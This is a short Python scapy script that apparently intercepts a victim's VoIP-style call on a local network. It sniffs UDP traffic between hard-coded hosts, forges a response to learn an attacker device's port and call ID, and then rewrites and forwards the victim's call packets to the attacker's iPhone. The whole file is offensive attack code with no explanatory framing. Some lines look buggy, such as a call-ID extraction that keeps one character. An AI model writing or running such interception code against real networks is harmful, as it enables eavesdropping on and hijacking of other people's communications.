import sys
import binascii
from scapy.all import *


iphone = "192.168.0.111"
iPhoneMAC = "REDACTED"
kali = "192.168.0.99"
macbook = "192.168.0.106"
prismacbook = "192.168.0.105"
prisIphone = "192.168.0.106"

spoofedPktdport = 0 # The port that got open in the attacker's phone


# Get payload and open port in attacker's phone
print "------Waiting for attacker's call..."
myfilter = "udp and src %s and dst %s" % (macbook, iphone)
pkt = sniff(iface="pflog0", filter=myfilter, count=1)
hexPkt =  str(pkt[0]).encode("HEX")
spoofedPktdport = int(hexPkt[172:176], 16)
attackerPayload = hexPkt[184:]
print "------Got the attacker's iPhone port: %s" % spoofedPktdport


print "------Send response to obtain the call ID"
myLoad = attackerPayload[:3] + '1' + attackerPayload[4:]
# I need to decode here all this info because this comes from unsupported pflog :((((
send(IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt.dport, dport=pkt.sport)/binascii.unhexlify(myLoad))


print "------Waiting for the attacker's call ID package..."
myfilter = "udp and src %s and dst %s" % (macbook, iphone)
pkt = sniff(iface="pflog0", filter=myfilter, count=1)
hexPkt =  str(pkt[0]).encode("HEX")
attackerPayload = hexPkt[184]
print "------Got the attacker's call ID: %s" % attackerPayload



def processPackage(pkt):
	print "------Packet received"
	print binascii.hexlify(pkt.load)
	pkt.show()
	#pkt.dst = iPhoneMAC
	#pkt[IP].dst = iphone # Modify IP to point to attacker iPhone
	#pkt.dport = spoofedPktdport # Modify port to point to attacker's iPhone open port
	print "------Packet will be sent"
	pkt.show()
	#send(pkt)
	send(IP(src=pkt[IP].src, dst=iphone)/UDP(sport=pkt.sport, dport=spoofedPktdport)/pkt.load)


print "------Waiting for the victim's call..."
myfilter = "udp and src %s and dst %s" % (prismacbook, macbook)
sniff(filter=myfilter, prn=processPackage)

